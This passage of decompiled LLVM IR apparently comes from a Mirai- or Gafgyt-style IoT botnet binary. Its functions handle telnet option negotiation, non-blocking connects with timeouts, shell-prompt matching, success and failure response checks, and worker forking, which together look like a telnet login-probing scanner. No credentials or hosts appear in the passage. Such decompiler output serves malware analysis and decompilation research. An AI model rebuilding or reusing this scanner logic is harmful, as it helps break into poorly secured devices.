  uselistorder i32 %tmp19, { 0, 3, 1, 2 }
  uselistorder i32 %tmp15, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 8, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 19, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_80492f9, { 1, 0 }
  uselistorder label %dec_label_pc_80492ea, { 1, 0 }
  uselistorder label %dec_label_pc_80492dc, { 1, 0 }
  uselistorder label %dec_label_pc_8049282, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80491ec, { 1, 0 }
}

define i32 @get_telstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v1_804930d = add i32 %tmp1, 4
  %v2_804930d = inttoptr i32 %v1_804930d to i32*
  %v3_804930d = load i32, i32* %v2_804930d, align 4
  %v1_8049319 = call i32 @__GI_inet_ntoa(i32 %v3_804930d)
  ret i32 %v1_8049319
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8049326 = load i32, i32* @edi, align 4
  store i32 %v0_8049326, i32* %stack_var_-8, align 4
  %v1_8049330 = inttoptr i32 %tmp4 to i8*
  store i32 %tmp4, i32* @edi, align 4
  %v1_8049335 = and i32 %tmp4, -256
  %v5_8049337 = call i8* @_memset(i8* %v1_8049330, i32 %v1_8049335, i32 %tmp5)
  %v4_8049345 = call i32 @read_with_timeout(i32 %arg1, i32 %tmp3, i32 %tmp4, i32 %tmp5)
  %v2_8049359 = inttoptr i32 %tmp to i32*
  %v3_8049359 = call i32 @contains_string(i32 %tmp4, i32* %v2_8049359)
  %v1_8049361 = icmp ne i32 %v3_8049359, 0
  %storemerge = zext i1 %v1_8049361 to i32
  %v3_8049378 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8049378, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp4, { 4, 0, 1, 3, 2 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_80493a4 = ptrtoint i32* %stack_var_-144 to i32
  %tmp21 = bitcast i32* %stack_var_-144 to i8*
  store i1 false, i1* @df, align 1
  %v5_80493ab = call i8* @_memset(i8* %tmp21, i32 0, i32 32)
  %v2_80493b8 = udiv i32 %arg1, 32
  %v1_80493be = urem i32 %arg1, 32
  %v0_80493c1 = load i32, i32* @ebp, align 4
  %v2_80493c1 = mul nuw nsw i32 %v2_80493b8, 4
  %v3_80493c1 = add nsw i32 %v2_80493c1, -140
  %v4_80493c1 = add i32 %v3_80493c1, %v0_80493c1
  %v5_80493c1 = inttoptr i32 %v4_80493c1 to i32*
  %v6_80493c1 = load i32, i32* %v5_80493c1, align 4
  %v9_80493c1 = shl i32 1, %v1_80493be
  %v12_80493c1 = or i32 %v6_80493c1, %v9_80493c1
  store i32 %v12_80493c1, i32* %v5_80493c1, align 4
  %v1_80493cc = add i32 %arg1, 1
  %v2_80493d0 = ptrtoint i32* %stack_var_-152 to i32
  %v5_80493e3 = call i32 @__libc_select(i32 %v1_80493cc, i32 %v2_80493a4, i32 0, i32 0, i32 %v2_80493d0)
  %tmp22 = icmp slt i32 %v5_80493e3, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_80493fb, label %dec_label_pc_8049415

dec_label_pc_80493fb:                             ; preds = %entry
  %v4_8049407 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_8049415

dec_label_pc_8049415:                             ; preds = %entry, %dec_label_pc_80493fb
  %storemerge = phi i32 [ %v4_8049407, %dec_label_pc_80493fb ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049415, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %v4_8049426 = icmp eq i32 %arg2, 0
  %v6_8049426 = trunc i32 %arg2 to i8
  %v1_804942a = icmp eq i1 %v4_8049426, false
  br i1 %v1_804942a, label %entry.dec_label_pc_804943d_crit_edge, label %dec_label_pc_804942c

entry.dec_label_pc_804943d_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804943d

dec_label_pc_804942c:                             ; preds = %entry
  %v2_804942f = load i32, i32* %arg1, align 4
  %v1_8049435 = call i32 @__libc_close(i32 %v2_804942f)
  br label %dec_label_pc_804943d

dec_label_pc_804943d:                             ; preds = %entry.dec_label_pc_804943d_crit_edge, %dec_label_pc_804942c
  %v1_8049440 = add i32 %tmp2, 16
  %v2_8049440 = inttoptr i32 %v1_8049440 to i32*
  store i32 0, i32* %v2_8049440, align 4
  %v3_804944f = add i32 %tmp2, 8
  %v4_804944f = inttoptr i32 %v3_804944f to i8*
  store i8 %v6_8049426, i8* %v4_804944f, align 1
  %v1_8049455 = add i32 %tmp2, 24
  %v2_8049455 = inttoptr i32 %v1_8049455 to i32*
  %v3_8049455 = load i32, i32* %v2_8049455, align 4
  %v3_8049466 = inttoptr i32 %v3_8049455 to i8*
  %v4_8049466 = call i32 @__GI_memset(i8* %v3_8049466, i32 0, i32 512)
  ret i32 %v4_8049466

; uselistorder directives
  uselistorder i32 %tmp2, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804943d, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1) local_unnamed_addr {
entry:
  %v2_804947e = inttoptr i32 %arg1 to i32*
  %v3_804947e = call i32 @advance_state(i32* %v2_804947e, i32 0)
  %v1_8049489 = add i32 %arg1, 9
  %v2_8049489 = inttoptr i32 %v1_8049489 to i8*
  store i8 1, i8* %v2_8049489, align 1
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v4_80494a0 = call i32 @contains_string(i32 %arg1, i32* bitcast ([3 x i8*]* @global_var_805b240.25 to i32*))
  ret i32 %v4_80494a0
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v4_80494bb = call i32 @contains_string(i32 %arg1, i32* bitcast ([7 x i8*]* @global_var_805b220.33 to i32*))
  ret i32 %v4_80494bb
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %v1_80494d1 = call i32 @contains_success(i32 %arg1)
  %v1_80494d9 = icmp eq i32 %v1_80494d1, 0
  %v1_80494db = icmp eq i1 %v1_80494d9, false
  br i1 %v1_80494db, label %dec_label_pc_80494ff, label %dec_label_pc_80494dd

dec_label_pc_80494dd:                             ; preds = %entry
  %v1_80494e3 = call i32 @contains_fail(i32 %arg1)
  %v1_80494eb = icmp ne i32 %v1_80494e3, 0
  %. = zext i1 %v1_80494eb to i32
  br label %dec_label_pc_80494ff

dec_label_pc_80494ff:                             ; preds = %dec_label_pc_80494dd, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_80494dd ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_8049504 = load i32, i32* @ebp, align 4
  store i32 %v0_8049504, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804951f

dec_label_pc_804951f:                             ; preds = %dec_label_pc_804951f, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_804951f, %dec_label_pc_804951f ]
  %v4_804951f = add i32 %stack_var_-12.0, 1
  %v2_8049525 = mul i32 %v4_804951f, 4
  %v5_8049528 = add i32 %v2_8049525, %tmp5
  %v1_804952b = inttoptr i32 %v5_8049528 to i32*
  %v2_804952b = load i32, i32* %v1_804952b, align 4
  %v1_804952d = icmp eq i32 %v2_804952b, 0
  %v1_804952f = icmp eq i1 %v1_804952d, false
  br i1 %v1_804952f, label %dec_label_pc_804951f, label %dec_label_pc_8049564.preheader

dec_label_pc_8049564.preheader:                   ; preds = %dec_label_pc_804951f
  %v2_804954c = inttoptr i32 %arg1 to i8*
  %v5_804956a16 = icmp sgt i32 %v4_804951f, 0
  br i1 %v5_804956a16, label %dec_label_pc_804953a.lr.ph, label %dec_label_pc_8049573

dec_label_pc_804953a.lr.ph:                       ; preds = %dec_label_pc_8049564.preheader
  br label %dec_label_pc_804953a

dec_label_pc_804953a:                             ; preds = %dec_label_pc_804953a.lr.ph, %dec_label_pc_8049561
  %storemerge117 = phi i32 [ 0, %dec_label_pc_804953a.lr.ph ], [ %v4_8049561, %dec_label_pc_8049561 ]
  %v2_804953d = mul i32 %storemerge117, 4
  %v5_8049540 = add i32 %v2_804953d, %tmp5
  %v1_8049543 = inttoptr i32 %v5_8049540 to i32*
  %v2_8049543 = load i32, i32* %v1_8049543, align 4
  store i32 %v2_8049543, i32* @eax, align 4
  %v3_804954c = call i32 @strcasestr(i8* %v2_804954c, i32 %v2_8049543)
  %v1_8049554 = icmp eq i32 %v3_804954c, 0
  br i1 %v1_8049554, label %dec_label_pc_8049561, label %dec_label_pc_8049573

dec_label_pc_8049561:                             ; preds = %dec_label_pc_804953a
  %v4_8049561 = add nuw nsw i32 %storemerge117, 1
  %v5_804956a = icmp slt i32 %v4_8049561, %v4_804951f
  br i1 %v5_804956a, label %dec_label_pc_804953a, label %dec_label_pc_8049573

dec_label_pc_8049573:                             ; preds = %dec_label_pc_804953a, %dec_label_pc_8049561, %dec_label_pc_8049564.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_8049564.preheader ], [ 0, %dec_label_pc_8049561 ], [ 1, %dec_label_pc_804953a ]
  %v2_8049576 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049576, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge117, { 1, 0 }
  uselistorder i32 %v4_804951f, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8049573, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804953a, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_804957b = load i32, i32* @edi, align 4
  %v3_804958c = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8049597 = or i32 %v3_804958c, 2048
  %v3_80495a9 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8049597)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_80495ba = urem i32 %arg3, 65536
  %v1_80495c3 = call i32 @htons(i32 %v1_80495ba)
  store i32 %arg2, i32* @edx, align 4
  %v3_80495dd = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_80495e5 = icmp eq i32 %v3_80495dd, 0
  br i1 %v1_80495e5, label %dec_label_pc_80495f8, label %dec_label_pc_80495e9

dec_label_pc_80495e9:                             ; preds = %entry
  br label %dec_label_pc_8049735

dec_label_pc_80495f8:                             ; preds = %entry
  %v2_80495d5 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8049617 = call i32 @__libc_connect(i32 %arg1, i32 %v2_80495d5, i32 16)
  %v5_8049622 = icmp slt i32 %v3_8049617, 0
  %v1_8049626 = icmp eq i1 %v5_8049622, false
  br i1 %v1_8049626, label %dec_label_pc_80496fc, label %dec_label_pc_804962c

dec_label_pc_804962c:                             ; preds = %dec_label_pc_80495f8
  %v1_804962c = call i32 @__errno_location(i32 %v3_8049617)
  %v1_8049631 = inttoptr i32 %v1_804962c to i32*
  %v2_8049631 = load i32, i32* %v1_8049631, align 4
  %v9_8049633 = icmp eq i32 %v2_8049631, 115
  %v1_8049636 = icmp eq i1 %v9_8049633, false
  br i1 %v1_8049636, label %dec_label_pc_80496f0, label %dec_label_pc_804963c

dec_label_pc_804963c:                             ; preds = %dec_label_pc_804962c
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8049659 = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049659, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049660 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_804966d = udiv i32 %arg1, 32
  %v1_8049673 = urem i32 %arg1, 32
  %v0_8049676 = load i32, i32* @ebp, align 4
  %v2_8049676 = mul nuw nsw i32 %v2_804966d, 4
  %v3_8049676 = add nsw i32 %v2_8049676, -164
  %v4_8049676 = add i32 %v3_8049676, %v0_8049676
  %v5_8049676 = inttoptr i32 %v4_8049676 to i32*
  %v6_8049676 = load i32, i32* %v5_8049676, align 4
  %v9_8049676 = shl i32 1, %v1_8049673
  %v12_8049676 = or i32 %v6_8049676, %v9_8049676
  store i32 %v12_8049676, i32* %v5_8049676, align 4
  %v1_8049681 = add i32 %arg1, 1
  %v2_8049685 = ptrtoint i32* %stack_var_-176 to i32
  %v5_8049698 = call i32 @__libc_select(i32 %v1_8049681, i32 0, i32 %v2_8049659, i32 0, i32 %v2_8049685)
  %tmp33 = icmp slt i32 %v5_8049698, 1
  br i1 %tmp33, label %dec_label_pc_80496e4, label %dec_label_pc_80496a4

dec_label_pc_80496a4:                             ; preds = %dec_label_pc_804963c
  store i32 4, i32* %stack_var_-180, align 4
  %v2_80496b1 = ptrtoint i32* %stack_var_-180 to i32
  %v2_80496b8 = ptrtoint i32* %stack_var_-184 to i32
  %v5_80496c6 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_80496b8, i32 %v2_80496b1)
  %v3_80496ce = load i32, i32* %stack_var_-184, align 4
  %v1_80496d4 = icmp eq i32 %v3_80496ce, 0
  br i1 %v1_80496d4, label %dec_label_pc_80496fc, label %dec_label_pc_80496d8

dec_label_pc_80496d8:                             ; preds = %dec_label_pc_80496a4
  br label %dec_label_pc_8049735

dec_label_pc_80496e4:                             ; preds = %dec_label_pc_804963c
  br label %dec_label_pc_8049735

dec_label_pc_80496f0:                             ; preds = %dec_label_pc_804962c
  br label %dec_label_pc_8049735

dec_label_pc_80496fc:                             ; preds = %dec_label_pc_80496a4, %dec_label_pc_80495f8
  %v3_8049706 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8049711 = and i32 %v3_8049706, -2049
  %v3_8049723 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8049711)
  br label %dec_label_pc_8049735

dec_label_pc_8049735:                             ; preds = %dec_label_pc_80496f0, %dec_label_pc_80496e4, %dec_label_pc_80496d8, %dec_label_pc_80495e9, %dec_label_pc_80496fc
  %v3_8049735 = phi i32 [ 0, %dec_label_pc_80496f0 ], [ 0, %dec_label_pc_80496e4 ], [ 0, %dec_label_pc_80496d8 ], [ 0, %dec_label_pc_80495e9 ], [ 1, %dec_label_pc_80496fc ]
  store i32 %v0_804957b, i32* @edi, align 4
  ret i32 %v3_8049735

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8049735, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8049743 = load i32, i32* @ebx, align 4
  store i32 %v0_8049743, i32* %stack_var_-8, align 4
  %v1_8049747 = call i32 @__libc_fork(i32 %v0_8049743)
  %v4_804974f = icmp eq i32 %v1_8049747, 0
  %v1_8049753 = icmp eq i1 %v4_804974f, false
  br i1 %v1_8049753, label %dec_label_pc_8049760, label %dec_label_pc_8049755

dec_label_pc_8049755:                             ; preds = %entry
  br label %dec_label_pc_8049844

dec_label_pc_8049760:                             ; preds = %entry
  %v0_8049760 = load i32, i32* @global_var_805b548.34, align 8
  %v0_8049765 = load i32, i32* @global_var_805b54c.35, align 4
  %v1_804976b = add i32 %v0_8049760, 1
  %v5_804976b = icmp eq i32 %v0_8049760, -1
  %v2_804976e = zext i1 %v5_804976b to i32
  %v3_804976e = add i32 %v2_804976e, %v0_8049765
  store i32 %v1_804976b, i32* @global_var_805b548.34, align 8
  store i32 %v3_804976e, i32* @global_var_805b54c.35, align 4
  %v2_804978b = mul i32 %v1_804976b, 4
  %v1_804978e = add i32 %v2_804978b, 4
  %v1_8049795 = call i32 @malloc(i32 %v1_804978e)
  br label %dec_label_pc_80497cb

dec_label_pc_80497a9:                             ; preds = %dec_label_pc_80497cb, %dec_label_pc_80497fc
  %v2_80497ac = mul i32 %storemerge1, 4
  %v5_80497b1 = add i32 %v2_80497ac, %v1_8049795
  %v0_80497bc = load i32, i32* @global_var_80617d4.36, align 4
  %v2_80497c1 = add i32 %v0_80497bc, %v2_80497ac
  %v1_80497c4 = inttoptr i32 %v2_80497c1 to i32*
  %v2_80497c4 = load i32, i32* %v1_80497c4, align 4
  %v2_80497c6 = inttoptr i32 %v5_80497b1 to i32*
  store i32 %v2_80497c4, i32* %v2_80497c6, align 4
  %v4_80497c8 = add i32 %storemerge1, 1
  br label %dec_label_pc_80497cb

dec_label_pc_80497cb:                             ; preds = %dec_label_pc_8049760, %dec_label_pc_80497a9
  %storemerge1 = phi i32 [ %v4_80497c8, %dec_label_pc_80497a9 ], [ 0, %dec_label_pc_8049760 ]
  %v0_80497d9 = load i32, i32* @global_var_805b548.34, align 8
  %v0_80497de = load i32, i32* @global_var_805b54c.35, align 4
  %v4_80497e8 = icmp ne i32 %v0_80497d9, 0
  %v2_80497eb = zext i1 %v4_80497e8 to i32
  %v3_80497eb = add i32 %v0_80497de, -1
  %v4_80497eb = add i32 %v3_80497eb, %v2_80497eb
  store i32 %v4_80497eb, i32* @ebx, align 4
  %v10_80497f7 = icmp eq i32 %v4_80497eb, 0
  br i1 %v10_80497f7, label %dec_label_pc_80497fc, label %dec_label_pc_80497a9

dec_label_pc_80497fc:                             ; preds = %dec_label_pc_80497cb
  %v1_80497e8 = add i32 %v0_80497d9, -1
  %v10_8049807 = icmp ult i32 %storemerge1, %v1_80497e8
  br i1 %v10_8049807, label %dec_label_pc_80497a9, label %dec_label_pc_804980c

dec_label_pc_804980c:                             ; preds = %dec_label_pc_80497fc
  %v2_8049817 = mul i32 %v0_80497d9, 4
  %v5_804981a = add i32 %v1_8049795, -4
  %v1_804981d = add i32 %v5_804981a, %v2_8049817
  store i32 %v1_804981d, i32* @edx, align 4
  %v2_8049823 = inttoptr i32 %v1_804981d to i32*
  store i32 %v1_8049747, i32* %v2_8049823, align 4
  %v0_8049825 = load i32, i32* @global_var_80617d4.36, align 4
  %v1_804982e = call i32 @free(i32 %v0_8049825)
  store i32 %v1_8049795, i32* @global_var_80617d4.36, align 4
  store i32 %v1_8049747, i32* @ecx, align 4
  br label %dec_label_pc_8049844

dec_label_pc_8049844:                             ; preds = %dec_label_pc_8049755, %dec_label_pc_804980c
  %v3_8049847 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8049847, i32* @ebx, align 4
  ret i32 %v1_8049747

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_80497ac, { 1, 0 }
  uselistorder i32 %v1_8049795, { 2, 0, 1 }
  uselistorder i32 %v0_8049760, { 1, 0 }
  uselistorder label %dec_label_pc_8049844, { 1, 0 }
  uselistorder label %dec_label_pc_80497cb, { 1, 0 }
  uselistorder label %dec_label_pc_80497a9, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804984c = load i32, i32* @ebp, align 4
  store i32 %v0_804984c, i32* %stack_var_-4, align 4
  %v1_8049855 = add i32 %arg2, 1
  %v1_8049856 = inttoptr i32 %v1_8049855 to i8*
  %v2_8049856 = load i8, i8* %v1_8049856, align 1
  %v5_8049856 = and i32 %v1_8049855, -256
  %v9_8049862 = icmp ult i8 %v2_8049856, -5
  br i1 %v9_8049862, label %dec_label_pc_8049942, label %dec_label_pc_804986f

dec_label_pc_804986f:                             ; preds = %entry
  %v7_8049876 = icmp eq i8 %v2_8049856, -1
  br i1 %v7_8049876, label %dec_label_pc_8049878, label %dec_label_pc_8049892

dec_label_pc_8049878:                             ; preds = %dec_label_pc_804986f
  br label %dec_label_pc_8049942

dec_label_pc_8049892:                             ; preds = %dec_label_pc_804986f
  store i32 -1, i32* %stack_var_-5, align 4
  %v2_804989d = ptrtoint i32* %stack_var_-5 to i32
  %v4_80498a4 = call i32 @__libc_send(i32 %arg1, i32 %v2_804989d, i32 1, i32 16384)
  %v2_80498b0 = load i8, i8* %v1_8049856, align 1
  %v11_80498b2 = icmp eq i8 %v2_80498b0, -4
  %v1_80498b4 = icmp eq i1 %v11_80498b2, false
  br i1 %v1_80498b4, label %dec_label_pc_80498bc, label %dec_label_pc_80498b6

dec_label_pc_80498b6:                             ; preds = %dec_label_pc_8049892
  store i32 -2, i32* %stack_var_-5, align 4
  br label %dec_label_pc_804990c

dec_label_pc_80498bc:                             ; preds = %dec_label_pc_8049892
  %v2_80498c0 = load i8, i8* %v1_8049856, align 1
  %v11_80498c2 = icmp eq i8 %v2_80498c0, -2
  %v1_80498c4 = icmp eq i1 %v11_80498c2, false
  br i1 %v1_80498c4, label %dec_label_pc_80498cc, label %dec_label_pc_80498c6

dec_label_pc_80498c6:                             ; preds = %dec_label_pc_80498bc
  store i32 -4, i32* %stack_var_-5, align 4
  br label %dec_label_pc_804990c

dec_label_pc_80498cc:                             ; preds = %dec_label_pc_80498bc
  %v2_80498d0 = load i8, i8* %v1_8049856, align 1
  %v10_80498d2 = icmp eq i8 %v2_80498d0, 3
  %v1_80498d4 = icmp eq i1 %v10_80498d2, false
  %v11_80498f8 = icmp eq i8 %v2_80498d0, -3
  %v1_80498fa = icmp eq i1 %v11_80498f8, false
  br i1 %v1_80498d4, label %dec_label_pc_80498f2, label %dec_label_pc_80498d6

dec_label_pc_80498d6:                             ; preds = %dec_label_pc_80498cc
  %. = select i1 %v1_80498fa, i32 253, i32 251
  %v7_80498ea = or i32 %., %v5_8049856
  store i32 %v7_80498ea, i32* %stack_var_-5, align 4
  br label %dec_label_pc_804990c

dec_label_pc_80498f2:                             ; preds = %dec_label_pc_80498cc
  %.2 = select i1 %v1_80498fa, i32 254, i32 252
  %v5_8049906 = load i32, i32* @edx, align 4
  %v6_8049906 = and i32 %v5_8049906, -256
  %v7_8049906 = or i32 %v6_8049906, %.2
  store i32 %v7_8049906, i32* %stack_var_-5, align 4
  br label %dec_label_pc_804990c

dec_label_pc_804990c:                             ; preds = %dec_label_pc_80498d6, %dec_label_pc_80498c6, %dec_label_pc_80498b6, %dec_label_pc_80498f2
  %v4_804991a = call i32 @__libc_send(i32 %arg1, i32 %v2_804989d, i32 1, i32 16384)
  %v1_8049925 = add i32 %arg2, 2
  %v4_8049933 = call i32 @__libc_send(i32 %arg1, i32 %v1_8049925, i32 1, i32 16384)
  %v2_8049945.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049942

dec_label_pc_8049942:                             ; preds = %dec_label_pc_8049878, %dec_label_pc_804990c, %entry
  %v2_8049945 = phi i32 [ %v0_804984c, %dec_label_pc_8049878 ], [ %v2_8049945.pre, %dec_label_pc_804990c ], [ %v0_804984c, %entry ]
  store i32 %v2_8049945, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %stack_var_-5, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049942, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804990c, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8049955 = ptrtoint i8* %arg1 to i32
  %v3_8049966 = call i32 @_strlen(i8* %arg1)
  %v4_8049966 = mul i32 %v3_8049966, -1
  %v1_804996c = sub i32 0, %v4_8049966
  %v6_8049993 = sub i32 %v4_8049955, %v4_8049966
  br label %dec_label_pc_8049a15

dec_label_pc_8049983:                             ; preds = %dec_label_pc_80499d3, %dec_label_pc_80499bc, %dec_label_pc_80499a5, %dec_label_pc_804998e
  %v4_8049983 = add nsw i32 %stack_var_-12.024, 1
  %v7_804998c = icmp slt i32 %v4_8049983, %v1_804996c
  br i1 %v7_804998c, label %dec_label_pc_804998e, label %dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge

dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge: ; preds = %dec_label_pc_8049983, %dec_label_pc_8049986.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_8049986.preheader ], [ %v4_8049983, %dec_label_pc_8049983 ]
  %.pre = sub i32 %v6_8049993, %stack_var_-12.0.lcssa
  %.pre8 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_80499ea

dec_label_pc_804998e:                             ; preds = %dec_label_pc_8049986.preheader, %dec_label_pc_8049983
  %stack_var_-12.024 = phi i32 [ %v4_8049983, %dec_label_pc_8049983 ], [ %stack_var_-12.1, %dec_label_pc_8049986.preheader ]
  %v2_804999b = sub i32 %v6_8049993, %stack_var_-12.024
  %v1_804999f = inttoptr i32 %v2_804999b to i8*
  %v2_804999f = load i8, i8* %v1_804999f, align 1
  %v4_80499a1 = icmp eq i8 %v2_804999f, 0
  br i1 %v4_80499a1, label %dec_label_pc_8049983, label %dec_label_pc_80499a5

dec_label_pc_80499a5:                             ; preds = %dec_label_pc_804998e
  %v2_80499b6 = load i8, i8* %v1_804999f, align 1
  %v7_80499b8 = icmp eq i8 %v2_80499b6, 32
  br i1 %v7_80499b8, label %dec_label_pc_8049983, label %dec_label_pc_80499bc

dec_label_pc_80499bc:                             ; preds = %dec_label_pc_80499a5
  %v2_80499cd = load i8, i8* %v1_804999f, align 1
  %v10_80499cf = icmp eq i8 %v2_80499cd, 13
  br i1 %v10_80499cf, label %dec_label_pc_8049983, label %dec_label_pc_80499d3

dec_label_pc_80499d3:                             ; preds = %dec_label_pc_80499bc
  %v2_80499e4 = load i8, i8* %v1_804999f, align 1
  %v10_80499e6 = icmp eq i8 %v2_80499e4, 10
  br i1 %v10_80499e6, label %dec_label_pc_8049983, label %dec_label_pc_80499ea

dec_label_pc_80499ea:                             ; preds = %dec_label_pc_80499d3, %dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge
  %stack_var_-12.020 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge ], [ %stack_var_-12.024, %dec_label_pc_80499d3 ]
  %v1_80499fb.pre-phi = phi i8* [ %.pre8, %dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge ], [ %v1_804999f, %dec_label_pc_80499d3 ]
  %v2_80499fb = load i8, i8* %v1_80499fb.pre-phi, align 1
  %v6_8049a00 = add i32 %storemerge1, ptrtoint ([6 x i8]* @global_var_8057a9c.37 to i32)
  %v1_8049a03 = inttoptr i32 %v6_8049a00 to i8*
  %v2_8049a03 = load i8, i8* %v1_8049a03, align 1
  %v15_8049a05 = icmp eq i8 %v2_80499fb, %v2_8049a03
  %v1_8049a07 = icmp eq i1 %v15_8049a05, false
  br i1 %v1_8049a07, label %dec_label_pc_8049a12, label %dec_label_pc_8049a3f

dec_label_pc_8049a12:                             ; preds = %dec_label_pc_80499ea
  %v4_8049a12 = add i32 %storemerge1, 1
  br label %dec_label_pc_8049a15

dec_label_pc_8049a15:                             ; preds = %entry, %dec_label_pc_8049a12
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.020, %dec_label_pc_8049a12 ]
  %storemerge1 = phi i32 [ 0, %entry ], [ %v4_8049a12, %dec_label_pc_8049a12 ]
  %v3_8049a29 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057a9c.37, i32 0, i32 0))
  %v7_8049a30 = icmp ult i32 %storemerge1, %v3_8049a29
  br i1 %v7_8049a30, label %dec_label_pc_8049986.preheader, label %dec_label_pc_8049a3f

dec_label_pc_8049986.preheader:                   ; preds = %dec_label_pc_8049a15
  %v7_804998c23 = icmp slt i32 %stack_var_-12.1, %v1_804996c
  br i1 %v7_804998c23, label %dec_label_pc_804998e, label %dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge

dec_label_pc_8049a3f:                             ; preds = %dec_label_pc_8049a15, %dec_label_pc_80499ea
  %storemerge = phi i32 [ 1, %dec_label_pc_80499ea ], [ 0, %dec_label_pc_8049a15 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_8049993, { 1, 0 }
